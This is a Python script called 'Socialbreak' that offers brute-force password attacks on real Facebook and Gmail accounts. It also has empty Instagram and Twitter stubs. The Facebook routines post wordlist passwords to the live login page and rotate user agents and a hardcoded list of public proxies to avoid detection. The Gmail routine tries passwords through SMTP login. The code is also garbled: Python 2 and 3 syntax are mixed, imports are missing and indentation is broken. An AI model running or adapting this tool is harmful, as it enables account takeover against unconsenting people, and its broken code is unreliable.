#!/usr/bin/python3
import os
import time
import sys
import smtplib
import mechanize
import random
import cookielib
import re
import banner

## Check if User is root or using Sudo
if not os.geteuid()==0:
    sys.exit('You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.')
time.sleep(1)
os.system('cls||clear')

def mainMenu():
    print("\n --------------------------------- ")
    print("\n             Socialbreak           ")
    print("\n --------------------------------- ")
    print(" What would you like to do? ")
    print("\n OPTION 1: Brute Force Facebook Account")
    print(" OPTION 2: Brute Force Gmail Account")
    print(" OPTION 3: Brute Force Instagram Account")
    print(" OPTION 4: Brute Force Twitter Account")
    print(" OPTION 0: Exit Tool")
    switchMenu(input())

def switchMenu(choice):
    if choice == '1':
        bffacebook()
    if choice == '2':
        bfgmail()
    if choice == '3':
        bfinstagram()
    if choice == '4':
        bftwitter()
    if choice == '0':
        exit()
    else:
        mainMenu()

def bffacebook(choice):
    print(" --------------------------------- ")
    print("        Bruteforce Facebook        ")
    print(" --------------------------------- ")

    os.system('clear')
    print (C+' 01'+R+'        :'+W+' Brute Single Target with Wordlist')
    print (C+' 02'+R+'        :'+W+' Brute Multiple Target with Single Password')
    print (C+' 03'+R+'        :'+W+' Brute Multiple Target with Wordlist')
    print ('')
    print (C+' 00'+R+'        :'+W+' Generate Random UID List')
    print ('')

    #User Agents    
    ua = [
   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
    ]
    prox = [
    'http://10.10.1.10:3128',
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080',
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281',
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128',
    'http://62.210.105.103:3128',
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080',
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80',
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80',
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80',
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080',
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080',
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080',
    'http://36.72.127.182:8080',
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080',
    'http://35.196.159.241:80',
    'http://27.122.224.183:80',
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080',
    'http://223.205.121.223:8080',
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080',
    'http://217.61.15.26:80',
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080',
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080',
    ]

    def singlefbbrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    email = input(C+' Username '+R+'> '+W)
    wlist = input(C+' Wordlist '+R+'> '+W)
    print ('')
    passwd = open(wlist, 'r')
    for password in passwd:
        form_data = {
            'email' : email,
            'pass' : password
        }
        user_agent = random.choice(ua)
        headers = {'User-Agent': user_agent}
        proxies_a = random.choice(prox)
        proxies = {'http': proxies_a}
        with requests.Session() as c:
            c.get(URL, headers=headers, proxies=proxies)
            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
            elif(str(a) == '<title>Facebook</title>'):
                print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
                print ('')
                print ('')
                print(C+' ['+W+' Result '+C+']'+R+' > '+G+'Success')
                print(C+' ['+W+' Password '+C+']'+R+' > '+W+password)
                main()

    def multifbbrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    username = input(C+' Userlist '+R+'> '+W)
    password = input(C+' Password '+R+'> '+W)
    print ('')
    uname = open(username, 'r')
    for email in uname:
        form_data = {
            'email' : email,
            'pass' : password
        }
        user_agent = random.choice(ua)
        headers = {'User-Agent': user_agent}
        proxies_a = random.choice(prox)
        proxies = {'http': proxies_a}
        with requests.Session() as c:
            c.get(URL, headers=headers, proxies=proxies)
            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+email,end='', flush=True)
            if(str(a) == '<title>Facebook</title>'):
                print(C+' ['+G+' OK '+C+']'+R+' > '+W+email,end='', flush=True)

    def multibrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    username = input(C+' Userlist '+R+'> '+W)
    passwd = input(C+' Wordlist '+R+'> '+W)
    print ('')
    uname = open(username, 'r')
    for email in uname:
        print(C+' ['+O+' USER '+C+']'+R+' > '+W+email)
        passw = open(passwd, 'r')
        for password in passw:
            form_data = {
                'email' : email,
                'pass' : password
            }
            user_agent = random.choice(ua)
            headers = {'User-Agent': user_agent}
            proxies_a = random.choice(prox)
            proxies = {'http': proxies_a}
            with requests.Session() as c:
                c.get(URL, headers=headers, proxies=proxies)
                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
                soup = BeautifulSoup(b.content, 'html.parser')
                a = soup.find('title')
                if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                    print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
                if(str(a) == '<title>Facebook</title>'):
                    print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
        print ('')

    def randid():
    print ('')
    print (C+' ['+G+' * '+C+']'+O+' Generating Facebook UID ...')
    print (W+'')
    os.system('php id.php')
    print ('')
    print (C+' ['+G+' * '+C+']'+O+' Done !!')

    def main():
    print ('')
    cmd = str(input(R+' > '+W))
    if cmd == '01' or cmd == '1':
        singlefbbrute()
        main()
    elif cmd == '02' or cmd == '2':
        multifbbrute()
        main()
    elif cmd == '03' or cmd == '3':
        multibrute()
        main()
    elif cmd == '00' or cmd == '0':
        randid()
        main()
    elif cmd == 'clear':
        banner()
        main()

    banner()
bffacebook()
#-----------------------#
#FACEBOOK BRUTEFORCE END#

def bfgmail(choice):
    print(" --------------------------------- ")
    print("        Bruteforce Gmail           ")
    print(" --------------------------------- ")
    #GMAIL BRUTEFORCE START#
    #----------------------#
    def main():
    main()
    print '\033[0m[1] start the attack'
    print '[2] exit'
    option = input('==>')
    if option == 1:
        file_path = raw_input('path of passwords file :')
    else:
        system('clear')
        exit()
    pass_file = open(file_path,'r')
    pass_list = pass_file.readlines()
    def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
    login()
#--------------------#
#GMAIL BRUTEFORCE END#
bfgmail()

def bfinstagram(choice):
    print(" --------------------------------- ")
    print("        Bruteforce Instagram       ")
    print(" --------------------------------- ")
bfinstagram()
#------------------------#
#INSTAGRAM BRUTEFORCE END#

def bftwitter(choice):
    print(" --------------------------------- ")
    print("        Bruteforce Twitter         ")
    print(" --------------------------------- ")
bftwitter()
#------------------------#
#TWITTER  BRUTEFORCE  END#